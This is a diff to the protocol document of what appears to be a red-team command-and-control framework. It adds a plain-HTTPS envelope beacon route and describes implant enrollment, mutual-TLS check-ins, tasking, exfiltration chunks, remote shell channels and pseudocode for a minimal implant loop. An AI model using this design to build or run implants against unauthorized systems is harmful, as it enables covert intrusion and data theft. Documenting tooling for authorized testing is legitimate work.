@@ -18,18 +18,22 @@ the code win and this file is a bug.
 
 ### Endpoints
 
-A deployment exposes two implant-facing endpoints (listener configuration,
+A deployment exposes three implant-facing endpoints (listener configuration,
 architecture.md Sec 8):
 
 | Purpose | Transport | Route |
 |---------|-----------|-------|
 | Enroll | Plain HTTP(S), anonymous | `POST /implants/enroll` |
-| Beacon / tasking | gRPC over mutual TLS | `/rod.v1.Beacon/CheckIn` |
+| Beacon / tasking (stream) | gRPC over mutual TLS | `/rod.v1.Beacon/CheckIn` |
+| Beacon / tasking (envelope) | Plain HTTPS POST over mutual TLS | `POST /implants/beacon` |
 
 The enroll listener accepts plain JSON with no client certificate -- the
 implant authenticates with the one-use stager token, not a cert it does not
-have yet. The beacon listener requires a client certificate that chains to
-the engagement CA; enrollment is what mints it.
+have yet. The beacon listeners require a client certificate that chains to
+the engagement CA; enrollment is what mints it. The two beacon shapes carry
+the same frames over the same certificates -- the stream is the interactive
+shape (server-push tasking, live channels), the envelope the poll shape that
+needs no gRPC stack.
 
 ### TLS shape
 
@@ -120,6 +124,42 @@ check-in cycles (poll mode -- drain queued tasking, half-close, wait for the
 server to end the stream, sleep the baked interval with jitter, reconnect and
 re-handshake). Both are Tier 0; the server treats them identically and reuses
 the implant's session across reconnects.
+
+### The envelope check-in (the no-gRPC alternative)
+
+`POST /implants/beacon` against the same mTLS listener the gRPC stream uses,
+presenting the same client certificate. The body is a sequence of rod.v1
+`Frame` messages, each prefixed with its byte length as an unsigned protobuf
+varint -- the canonical delimited-stream shape every protobuf runtime ships.
+One POST is one poll check-in:
+
+- **Request body:** the handshake `Frame` first, then any `TaskResult`,
+  `ExfilChunk`, `StagedPull`, and `ChannelOutput` frames. The server's caps
+  are 2 MiB per frame, 1024 frames, and 16 MiB per body: an oversized frame,
+  count, or body answers `413`, malformed framing answers `400`, and a
+  request without the client certificate answers `401` before any frame is
+  read.
+- **Response body:** the `HandshakeResponse` frame first, then the
+  `StagedChunk` run answering each request-body `StagedPull` (in demand
+  order), then dispatched `TaskRequest` frames in queue order while the 4 MiB
+  dispatch budget lasts -- what does not fit is requeued and rides the next
+  check-in. A non-OK handshake response is the only frame in the body: the
+  check-in is refused, and every non-OK status is permanent exactly as on the
+  stream.
+- **Poll discipline:** check in, drain, close, sleep the baked interval with
+  jitter, repeat. Every POST re-handshakes; the server reuses the session
+  across check-ins, so the cadence neither churns session entities nor
+  floods the engagement trail with `SessionOpened` records.
+- **The envelope's bounds:** an artifact's `ExfilChunk` run must begin and
+  end inside one request body (the reassembler is per-request), and a
+  channel task (`shell.interact`) is never claimed over the envelope -- its
+  input half needs a live stream, so it stays queued until a stream
+  transport claims it, the same rule the DNS transport applies.
+
+The frame contents, the handshake order, the signature discipline, and the
+result/chunk grammar are identical to the stream's -- only the carriage
+changes. An implant that implements the envelope needs an HTTP client and a
+protobuf codec, nothing else.
 
 ### Task results and bulk data
 
@@ -227,7 +267,9 @@ The smallest implant that enrolls, checks in, and executes tasking:
 1. **Enroll.** Generate an RSA-2048 key pair. POST the public key with the
    stager token. Receive the ids, the leaf, and the CA chain. Keep the private
    key; never transmit it.
-2. **Beacon.** Open `/rod.v1.Beacon/CheckIn` over mTLS with the leaf.
+2. **Beacon.** Open `/rod.v1.Beacon/CheckIn` over mTLS with the leaf -- or
+   POST the envelope route (`/implants/beacon`, above) with the same leaf and
+   no gRPC stack.
 3. **Handshake.** Send the `HandshakeRequest` first; require OK; treat every
    other status as permanent.
 4. **Task loop.** Parse each downstream `TaskRequest`, execute its verb
@@ -246,6 +288,8 @@ leaf   = cert(enroll.leafCertificate) paired with key
 cas    = [cert(b) for b in enroll.caChain]
 
 forever:
+    # The envelope alternative drops the gRPC stack entirely: one HTTPS POST
+    # to /implants/beacon per cycle, same frames, same certificates.
     stream = grpc_connect("teamserver:port", mTLS(leaf, trust = chain_to(cas)))
     send Frame(payload = HandshakeRequest{1, 0, enroll.implantId, my_verbs})
     if HandshakeResponse.parse(recv()).status != OK: exit
@@ -331,11 +375,12 @@ from quietly growing:
 
 ## Calibration note
 
-Tier 0's heaviest piece today is the gRPC/HTTP-2 channel, not the crypto or
-the messages. The recorded escape hatch is a plain-HTTP-envelope listener
-(architecture.md Sec 8): the same rod.v1 frames carried as delimited
-sequences in ordinary HTTP request/response bodies over the same client
-certificates, dropping the gRPC requirement without changing the protocol
-semantics -- one POST becomes one poll check-in. It is scheduled on the todo
-list; until it ships, an implant needs a gRPC stack (or hand-rolled HTTP/2,
-which the framing above makes mechanical).
+Tier 0's heaviest piece used to be the gRPC/HTTP-2 channel, not the crypto or
+the messages. The plain-HTTP envelope check-in (above) shipped as the answer:
+the same rod.v1 frames carried as delimited sequences in ordinary HTTP
+request/response bodies over the same client certificates, one POST per poll
+check-in, so Tier 0 now needs only an HTTP client and a protobuf codec. The
+gRPC stream remains the interactive shape -- server-push tasking the moment
+it is queued, and the live channels -- so an implant that wants
+`shell.interact` still wants the stream; an implant that only polls has no
+reason to carry a gRPC stack at all.
